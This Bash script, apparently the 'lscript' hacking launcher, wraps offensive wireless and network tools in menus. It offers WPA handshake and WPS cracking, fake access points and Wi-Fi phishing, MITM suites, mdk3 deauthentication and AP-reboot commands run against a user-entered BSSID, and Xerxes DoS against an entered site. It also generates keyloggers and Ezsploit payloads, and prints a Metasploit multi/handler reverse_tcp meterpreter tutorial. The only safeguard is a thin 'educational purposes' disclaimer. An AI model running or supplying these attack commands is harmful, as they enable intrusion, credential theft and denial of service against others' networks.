#! /bin/bash
VERSION=1.3
function interface_selection
{
echo -e "\e[1;33m 1\e[0m) $WLANN"
echo -e "\e[1;33m 2\e[0m) $WLANNM"
echo -e "\e[1;33m 3\e[0m) Eth0"
echo -e "\e[1;33m00\e[0m) Main menu"
echo -e "\e[1;33m 0\e[0m) EXIT"
read -e MYINT
if [ "$MYINT" = "2" ]
then
	MYINT="$WLANNM"
elif [ "$MYINT" = "1" ]
then
	MYINT="$WLANN"
elif [ "$MYINT" = "0" ]
then
	clear
	exit
elif [ "$MYINT" = "00" ]
then
	exec bash "$0"
elif [ "$MYINT" = "3" ]
then
	MYINT="eth0"
else
echo -e "Interface not supported.Contact developer."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function set_interface_number
{
echo -e "Enter the number of your wireless card(etc type \e[1;33m0\e[0m if wlan0): " 
read INUMB
echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
read INTCONFNUMB
if [ "$INTCONFNUMB" = "n" ]
then
	clear
	echo -e "Then why did you type that? lol"
	sleep 3
	exec bash "$0"
else
	echo wlan$INUMB > /root/lscript/wlan.txt
	echo wlan"$INUMB"mon > /root/lscript/wlanmon.txt
	echo -e "Done "
	sleep 1
	clear
	echo -e "If you want to change it, type \e[1;33minterface\e[0m any time"
	sleep 1
	echo -e "Press \e[1;33many key\e[0m to continue..."
	read	
fi
}
if [ -f "/root/lscript/IAGREE.txt" ]
then

	if [ ! -f "/root/lscript/wlan.txt" ]
	then
		set_interface_number
	fi
	
clear
WLANNM=$(cat /root/lscript/wlanmon.txt)
WLANN=$(cat /root/lscript/wlan.txt)
export WLANNM
export WLANN
echo -e ""
echo -e "\e[1;31m         ██╗      █████╗ ███████╗██╗   ██╗\e[0m v$VERSION"
echo -e "\e[1;31m         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝\e[0m"
echo -e "\e[1;31m         ██║     ███████║  ███╔╝  ╚████╔╝ \e[0m   by \e[0;31mARIS MELACHROINOS\e[0m"
echo -e "\e[1;31m         ██║     ██╔══██║ ███╔╝    ╚██╔╝  \e[0m"
echo -e "\e[1;31m    The  ███████╗██║  ██║███████╗   ██║  script\e[0m"
echo -e "\e[1;31m         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   \e[0m"
echo -e "\e[1;33mif\e[0m) Ifconfig"
echo -e "\e[1;33m 1\e[0m) Enable $WLANN                      \e[1;33md1\e[0m) Disable $WLANN"
echo -e "\e[1;33m 2\e[0m) Enable $WLANNM                   \e[1;33md2\e[0m) Disable $WLANNM"
echo -e "\e[1;33m 3\e[0m) Change MAC                        \e[1;33md3\e[0m) Restore original MAC"
echo -e "\e[1;33m 4\e[0m) Enable torghost(BROKEN TOOL)      \e[1;33md4\e[0m) Disable torghost"
echo -e "\e[1;33m 5\e[0m) Enable anonym8                    \e[1;33md5\e[0m) Disable anonym8"
echo -e "\e[1;33m 6\e[0m) Status of anonym8                 \e[1;33md6\e[0m) Restart anonym8"
echo -e "\e[1;33m 7\e[0m) View your Public IP"
echo -e "\e[1;33m 8\e[0m) View your MAC"
echo -e "\e[1;33m 9\e[0m) TOOLS"
echo -e "\e[1;33m10\e[0m) Handshake       (WPA-WPA2)        \e[1;33mstart\e[0m) 1 2 3"
echo -e "\e[1;33m11\e[0m) Find WPS pin    (WPA-WPA2)         \e[1;33mstop\e[0m) d2 d3"
echo -e "\e[1;33m12\e[0m) WEP hacking     (WEP)            \e[1;33mupdate\e[0m) Check for updates"
echo -e "\e[1;33m 0\e[0m) EXIT                             \e[1;33merrors\e[0m) Fix some errors"
echo "Choose: "
read -e YORNAA
clear
	if [ "$YORNAA" = "0" ]
	then
		exit
	elif [ "$YORNAA" = "interface" ]
	then
		clear
		WLANN=$(cat /root/lscript/wlan.txt)
		WLANNM=$(cat /root/lscript/wlanmon.txt)
		echo -e "Your current wireless interface names are $WLANN and $WLANNM"
		sleep 2
		echo -e "Do you want to change you interface number?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
		read INAG
		if [ "$INAG" = "n" ]
		then
			clear
			echo -e "Then why did you come here? lol"
			sleep 2
			exec bash "$0"
		else
			clear
			rm /root/lscript/wlan.txt
			rm /root/lscript/wlanmon.txt
			set_interface_number
		fi
	elif [ "$YORNAA" = "9" ]
	then
		echo -e "------------------------------\e[1;31mTOOLS\e[0m------------------------------"
		echo -e "\e[1;33m 1\e[0m) Wifi tools"
		echo -e "\e[1;33m 2\e[0m) Remote access"
		echo -e "\e[1;33m00\e[0m) Main menu"
		echo -e "\e[1;33m 0\e[0m) EXIT"
		echo "Choose: "
		read -e CATEG
			if [ "$CATEG" = "1" ]
			then
				clear
				echo -e "---------------------------\e[1;31mWIFI TOOLS\e[0m----------------------------"
				echo -e "\e[1;33m 1\e[0m) Fluxion            Multitool-Fake AP with pass confirmation"
				echo -e "\e[1;33m 2\e[0m) Wifite             Multitool"
				echo -e "\e[1;33m 3\e[0m) Wifiphisher        Multitool-Fake AP etc.."
				echo -e "\e[1;33m 4\e[0m) Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
				echo -e "\e[1;33m 5\e[0m) Morpheus           ------------ULTIMATE MITM SUIT------------"
				echo -e "\e[1;33m 6\e[0m) Osrfconsole        Checks usernames-phones to platforms etc.."
				echo -e "\e[1;33m 7\e[0m) Hakku              Multitool-mail bomb-sniffs-cracks etc.."
				echo -e "\e[1;33m 8\e[0m) Trity              Multitool-locate ip-email bombs-brutforse etc.."
				echo -e "\e[1;33m 9\e[0m) Cupp               Make specific worldlists"
				echo -e "\e[1;33m10\e[0m) Dracnmap           Many scan options"
				echo -e "\e[1;33m11\e[0m) Fern               Wifi cracker GUI"
				echo -e "\e[1;33m12\e[0m) Netdiscover        IPs and MACs on your net"
				echo -e "\e[1;33m13\e[0m) KickThemOut        Kick clients out of your network"
				echo -e "\e[1;33m14\e[0m) Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
				echo -e "\e[1;33m15\e[0m) The Eye            Detects ARP poisoning DNS spoofing etc..."
				echo -e "\e[1;33m16\e[0m) Xerxes             The most powerful DoS tool(CAUTION)"
				#~ echo -e "\e[1;33m16\e[0m) ShARP(problematic) Detects who is spoofing on your network"
				echo -e "\e[1;33m17\e[0m) Mdk3-master        Tries to lock / reboot AP and more..."
				echo -e "\e[1;33m18\e[0m) Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
				echo -e "\e[1;33m19\e[0m) Katana Framework   Many penetration testing features"
				echo -e "\e[1;33m20\e[0m) Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
				echo -e "\e[1;33m00\e[0m) Main menu"
				echo -e "\e[1;33m 0\e[0m) EXIT"
				echo -e "Choose: "
				read -e APPP
				if [ "$APPP" = "1" ]
				then
					clear
					cd /root/fluxion
					./fluxion
					cd
				elif [ "$APPP" = "2" ]
				then
					clear
					wifite
				elif [ "$APPP" = "3" ]
				then
					clear
					echo -e "Do you have 1 or 2 wireless interfaces?: "
					read ONEORTWO
					if [ "$ONEORTWO" = "1" ]
					then
						clear
						echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
						sleep 1
						echo -e ""
						echo -e "Press \e[1;33many key\e[0m to continue"
						read
						clear
						wifiphisher -nJ
					else
						clear
						wifiphisher
					fi
				elif [ "$APPP" = "4" ]
				then
					if [ -d "/root/Zatacker" ]
					then
						clear	
						cd /root/Zatacker
						./ZT.sh
						cd
					else
						echo -e "You have to install it manually since its not on github.Sorry."
						sleep 4
						exec bash "$0"
					fi
				elif [ "$APPP" = "5" ]
				then
					clear	
					cd /root/morpheus
					./morpheus.sh
					cd
				elif [ "$APPP" = "7" ] 
				then
					clear
					echo -e "type: 'show modules' to start"
					sleep 2
					clear
					cd /root/hakkuframework
					./hakku
					cd
				elif [ "$APPP" = "8" ]
				then
					clear	
					echo -e "type: 'help' to start"
					sleep 2
					clear
					trity			
				elif [ "$APPP" = "9" ]
				then
					clear	
					cd /root/cupp
					python cupp.py -i
					cd			
				elif [ "$APPP" = "10" ]
				then
					clear	
					cd /Dracnmap/
					./dracnmap-v*.sh	
					cd		
				elif [ "$APPP" = "11" ]
				then
					clear	
					cd /root/Fern-Wifi-Cracker
					python execute.py
					cd
				elif [ "$APPP" = "12" ]
				then
					clear	
					netdiscover
				elif [ "$APPP" = "13" ]
				then
					clear	
					cd /root/kickthemout
					python kickthemout.py
					cd
				elif [ "$APPP" = "14" ]
				then
					clear	
					cd /root/ghost-phisher/Ghost-Phisher
					python ghost.py
					cd
				elif [ "$APPP" = "15" ]
				then
					clear	
					cd /root/The-Eye
					./TheEye
					cd
				elif [ "$APPP" = "16" ]
				then
					clear
					echo -e "Do you own the site you want to DoS?(\e[1;33my\e[0m/\e[1;33mn\e[0m)"
					read DOSTERM
					if [ "$DOSTERM" = "y" ]
					then

						clear
						echo -e "Enter your site(etc iownthissite.com): "
						echo -e "(without www)"
						read -e SITEDOS
						Launching www.isitdownrightnow.com for $SITEDOS
						sleep 4
						xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
						clear	
						cd /root/xerxes
						SITEDOSX=www.$SITEDOS
						echo -e "Press \e[1;33many key\e[0m to start DoS on $SITEDOSX"
						read
						./xerxes $SITEDOSX 80
					else
						clear
						echo -e "Then never try this."
						sleep 3
						exec bash "$0"
					fi
				elif [ "$APPP" = "17" ]
				then
					clear	
					echo -e "Press \e[1;33many key\e[0m to start scanning."
					echo -e "Press \e[1;33mCTRL C\e[0m when you find your target AP"
					read
					airodump-ng $WLANNM
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's channel: "
					read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
				elif [ "$APPP" = "18" ]
				then
					clear	
					echo -e "Press \e[1;33many key\e[0m to start scanning with wash."
					read
					gnome-terminal -e 'wash -i $WLANNM'
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's ESSID: "
					read -e MDESSID
					#~ echo -e "Enter your target's channel: "
					#~ read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
				elif [ "$APPP" = "19" ]
				then
					clear	
					ktf.console
				elif [ "$APPP" = "20" ]
				then
					clear	
					cd /root/airgeddon
					./airgeddon.sh
					cd
				elif [ "$APPP" = "6" ]
				then
					clear	
					echo -e "\e[1;33m 1\e[0m) usufy"
					echo -e "\e[1;33m 2\e[0m) mailfy"
					echo -e "\e[1;33m 3\e[0m) searchfy"
					echo -e "\e[1;33m 4\e[0m) domainfy"
					echo -e "\e[1;33m 5\e[0m) phonefy"
					echo -e "\e[1;33m 6\e[0m) entify"
					echo -e "\e[1;33m00\e[0m) Main menu"
					echo -e "\e[1;33m 0\e[0m) EXIT"
					echo -e "Choose: "
					read -e OSFR
						if [ "$OSFR" = "1" ]
						then
							clear
							echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
							usufy.py
							exit
						elif [ "$OSFR" = "2" ]
						then
							clear
							echo -e "Use: mailfy.py -n name1"
							mailfy.py
							exit
						elif [ "$OSFR" = "3" ]
						then
							clear
							searchfy.py
							exit
						elif [ "$OSFR" = "4" ]
						then
							clear
							domainfy.py
							exit
						elif [ "$OSFR" = "5" ]
						then
							clear
							phonefy.py
							exit
						elif [ "$OSFR" = "6" ]
						then
							clear
							entify.py
							exit
						elif [ "$OSFR" = "0" ]
						then
							clear
							exit
						elif [ "$OSFR" = "00" ]
						then
							clear
							exec bash "$0"
						else 
							echo -e "I can't do that bro..."
							sleep 2
							clear
							echo -e "Let's try again..."
							sleep 1
							exec bash "$0"
						fi
				elif [ "$APPP" = "0" ]
				then
					clear
					exit
				elif [ "$APPP" = "00" ]
				then
					clear
					exec bash "$0"
				fi
			elif [ "$CATEG" = "2" ]
			then
				clear
				echo -e "-------------------------\e[1;31mRemote access\e[0m---------------------------"
				echo -e "\e[1;33m 1\e[0m) BeeLogger		Generate keylogger"
				echo -e "\e[1;33m 2\e[0m) Ezsploit      Generate payloads for many platforms,listeners etc..."
				echo -e "\e[1;33m00\e[0m) Main menu"
				echo -e "\e[1;33m 0\e[0m) EXIT"
				echo -e "Choose: "
				read -e KEYLOG
				if [ "$KEYLOG" = "1" ]
				then
					cd /root/BeeLogger
					python bee.py
					cd
				elif [ "$KEYLOG" = "2" ]
				then
					clear
					cd /root/ezsploit/
					./ezsploit.sh
					cd
					echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
					echo -e "Open a new terminal and type:"
					echo -e "msfconsole"
					echo -e "use exploit/multi/handler"
					echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
					echo -e "set lhost <YOUR IP HERE>"
					echo -e "set lport 4444"
					echo -e "exploit"
					echo -e "Press \e[1;33many key\e[0m to leave..."
					read
					exec bash "$0"
				elif [ "$KEYLOG" = "00" ]
				then
					clear
					exec bash "$0"
				elif [ "$KEYLOG" = "0" ]
				then
					clear
					exit
				fi
			elif [ "$CATEG" = "0" ]
			then
				clear
				exit
			elif [ "$CATEG" = "00" ]
			then
				clear
				exec bash "$0"
			fi	
	elif [ "$YORNAA" = "clear" ]
	then
		echo -e "Ok.I can clear for you..."
		sleep 1
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "gg" ]
	then
		geany /bin/lscript/l
	elif [ "$YORNAA" = "1" ]
	then
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN up
		echo -e "Done."
	elif [ "$YORNAA" = "d1" ]
	then
		echo -e "Disabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN down
		echo -e "Done."
	elif [ "$YORNAA" = "2" ]
	then
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		airmon-ng start $WLANN
		echo -e "Done."
	elif [ "$YORNAA" = "d2" ]
	then
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		airmon-ng stop $WLANNM
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		echo -e "$WLANN is probably up.Bring it down?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
		read -e YORN
		if [ "$YORN" = "y" ] 
		then
			#rfkill unblock wifi
			#rfkill unblock all
			ifconfig $WLANN down
			echo -e "$WLANN is now down."
		fi
	elif [ "$YORNAA" = "3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to a random one..."
		ifconfig $MYINT down
		macchanger -r $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "d3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "4" ]
	then
		echo -e "Enabling torghost..."
		sleep 1
		echo -e ""
		echo -e "Torghost is problematic for now.Choose anonym8 instead."
		sleep 5
		exec bash "$0"
		#~ torghost start
		#~ echo -e "Done."
	elif [ "$YORNAA" = "d4" ]
	then
		echo -e "Disabling torghost..."
		torghost stop
		echo -e "Done."
	elif [ "$YORNAA" = "5" ]
	then
		echo -e "Enabling anonym8..."
		anonym8 start
		echo -e "Done."
	elif [ "$YORNAA" = "d5" ]
	then
		echo -e "Disabling anonym8..."
		anonym8 stop
		echo -e "Done."
	elif [ "$YORNAA" = "6" ]
	then
		echo -e "Status of anonym8..."
		anonym8 status
		echo -e "Done."
	elif [ "$YORNAA" = "r6" ]
	then
		echo -e "Restarting anonym8..."
		anonym8 change
		echo -e "Done."
	elif [ "$YORNAA" = "7" ]
	then
		echo "Your public IP is: "
		curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	elif [ "$YORNAA" = "8" ]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [ "$YORNAA" = "10" ]
	then
		clear
		echo -e "Moving into new terminal..."
		sleep 1
		FJC=0
		export FJC
		gnome-terminal -e lh1
		sleep 1
		exec bash "$0"
	elif [ "$YORNAA" = "11" ]
	then
		clear
		echo -e "Moving into new terminal..."
		sleep 1
		gnome-terminal -e lh3
		sleep 1
		exec bash "$0"
	elif [ "$YORNAA" = "12" ]
	then
		clear
		echo -e "Moving into new terminal..."
		sleep 1
		gnome-terminal -e lh4
		sleep 1
		exec bash "$0"
	elif [ "$YORNAA" = "update" ]
	then
		#----------update-check-----------
		clear
		echo -e "Checking for updates..."
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [ "$VERSION" != "$VER" ]
		then
		clear
		echo -e "There is an update available."
		echo -e "Current version: $VERSION"
		echo -e "Updated version: $VER"
		echo -e "Press \e[1;33many key\e[0m to continue..."
		read
		clear
		#~ echo -e "I dont know if this works.So if it doesn't, to update the script just delete the /root/lscript folder from your system and then go again to https://github.com/arismelachroinos/lscript and reinstall it to get the newest one."
		sleep 5		
		echo -e "I am not sure if it works."
		echo -e "Do you still want to try to update automatically?(\e[1;33my\e[0m/\e[1;33mn\e[0m): "
		read UPDATEYN
		if [ "$UPDATEYN" = "y" ]
		then
			clear
			echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
			sleep 2
			mkdir /root/lscriptold
			echo -e ""
			echo -e "Moving lscript to lscriptold"
			sleep 2
			mv /root/lscript /root/lscriptold
			echo -e "Cloning the latest github version to new /root/lscript"
			sleep 2
			cd
			git clone https://github.com/arismelachroinos/lscript.git
			cd /root/lscript
			chmod +x install.sh
			clear
			echo -e "Ok , everything seems to be fine by now."
			sleep 1
			echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
			echo -e ""
			sleep 3
			echo -e "Press \e[1;33many key\e[0m to continue..."
			read
			cd /root/lscript
			gnome-terminal -e ./install.sh
			clear 
			echo -e "If it doesn't work , please contact me"
			sleep 4
			echo -e ""
			echo -e "Removing old lscript"
			rmdir -r /root/lscriptold
			exit
		else 
			clear
			echo -e "You didnt select "y" so you go back..."
			sleep 3
			exec bash "$0"
		fi
		else
		echo -e "There is no update available"
		sleep 1
		echo -e "Installed version: $VERSION"
		sleep 1
		echo -e "Github version:    $VER"
		sleep 1
		echo -e "Press \e[1;33many key\e[0m to go back..."
		read		
		exec bash "$0"
		fi
	elif [ "$YORNAA" = "if" ]
	then
		ifconfig
	elif [ "$YORNAA" = "errors" ]
	then
		#---------------------------------------------------------------------------------------------------------------------------
		echo -e "-----------------------------\e[1;31mERRORS\e[0m------------------------------"
		echo -e "\e[1;33m 1\e[0m) Fix no audio issue"
		echo -e "\e[1;33m 2\e[0m) No output in wash"
		#~ echo -e " 2) "
		echo -e "\e[1;33m00\e[0m) Main menu"
		echo -e "\e[1;33m 0\e[0m) EXIT"
		echo -e " Choose: "
		read ERRS
		if [ "$ERRS" = "1" ]
		then
			clear
			echo -e "Trying to get you some audio..."
			sleep 2
			clear
			echo -e "Press \e[1;33my\e[0m if/when prompted"
			sleep 3
			clear
			echo -e "Installing pulseaudio......."
			sleep 1
			apt-get pulseaudio
			echo -e "Enabling pulseaudio......."
			sleep 1
			systemctl --user enable pulseaudio && systemctl --user start pulseaudio
			clear
			echo -e "Done!"
			sleep 1
			clear
			echo -e "I mean...Try to see if you have audio."
			sleep 3
			echo -e " "
			echo -e "That's all i can do :/"
			sleep 2
			echo -e " "
			echo -e "If it wasn't fix , then try rebooting"
		elif [ "$ERRS" = "2" ]
		then
			clear
			echo -e "Ok...Lets try to fix this..."
			sleep 1
			mkdir /etc/reaver
			echo -e "It seems to be fixed."
			echo -e "Enter you interface"
			read INTWASH
			echo -e "Press \e[1;33many key\e[0m to test wash"
			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
			wash -i $INTWASH
		elif [ "$ERRS" = "0" ]
		then
			clear
			echo -e "EXITING"
			sleep 1
			clear
			exit
		elif [ "$ERRS" = "00" ]
		then
			clear
			exec bash "$0"
		else
			clear
			echo -e "Not an valid option...."
			exec bash "$0"
		fi
		#---------------------------------------------------------------------------------------------------------------------------
	elif [ "$YORNAA" = "start" ]
	then
		echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
		ifconfig eth0 down
		macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
		ifconfig eth0 up
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN up
		echo -e "$WLANN enabled"
		echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
		ifconfig $WLANN down
		macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
		ifconfig $WLANN up
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		airmon-ng start $WLANN
		echo -e "Done."
		echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
		ifconfig $WLANNM down
		macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
		ifconfig $WLANNM up
		echo -e "Done."
		echo -e "SUCCESS!"
#----------
		elif [ "$YORNAA" = "stop" ]
		then
		echo -e "Changing mac address of $WLANNM to the original one..."
		ifconfig $WLANNM down
		macchanger -p $WLANNM
		ifconfig $WLANNM up
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		airmon-ng stop $WLANNM
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		#~ echo -e "$WLANN is probably down.Bring it up?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
		#~ read -e YORN
		#~ if [ "$YORN" = "y" ]  
		#~ then
			#~ #rfkill unblock wifi
			#~ #rfkill unblock all
			#~ ifconfig $WLANN up
			#~ echo -e "$WLANN is now up."
		#~ fi
		echo -e "Changing mac address of $WLANN to the original one..."
		ifconfig $WLANN down
		macchanger -p $WLANN
		ifconfig $WLANN up
		echo -e "Changing mac address of eth0 to the original one..."
		ifconfig eth0 down
		macchanger -p eth0
		ifconfig eth0 up
		echo -e "Done."
		echo -e "SUCCESS!"
	else
		echo -e "I can't do that bro..."
		sleep 1
		clear
		echo -e "Let's try again..."
		sleep 1
		exec bash "$0"
	fi
echo -e "Choose again?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
read -e YORNLAST
if [ -z "$YORNLAST" ]
then
	clear
	exec bash "$0"
elif [ "$YORNLAST" = "y" ]
then
	clear
	exec bash "$0"
else 
	clear
	exit
fi
else
	echo -e "You need to accept the terms."
	sleep 1
	echo -e "Press \e[1;33menter\e[0m to continue..."
	read
	clear
	echo -e "This tool is only for educational purposes only."
	sleep 2
	echo -e "Use this tool only on yourown network and never without permission."
	sleep 2
	echo -e "I am not responsible for anything you do with this tool."
	sleep 2
	echo -e "Will you use this tool only on yourown network and only with yourown responsibility?(\e[1;33mYES\e[0m/\e[1;33mNO\e[0m): "
	read YESORNO
	if [ "$YESORNO" = "YES" ]
	then 
		echo "You have agreed the terms and you use this tool with yourown responsibility." > /root/lscript/IAGREE.txt
		sleep 1
		clear
		echo -e "Adding lscript to PATH so you can access it from anywhere"
		sleep 2
		export PATH=/bin/lscript:$PATH
		sleep 3
		echo "export PATH=/bin/lscript:$PATH" >> ~/.bashrc
		sleep 2
		clear
	fi
	exec bash "$0"
fi
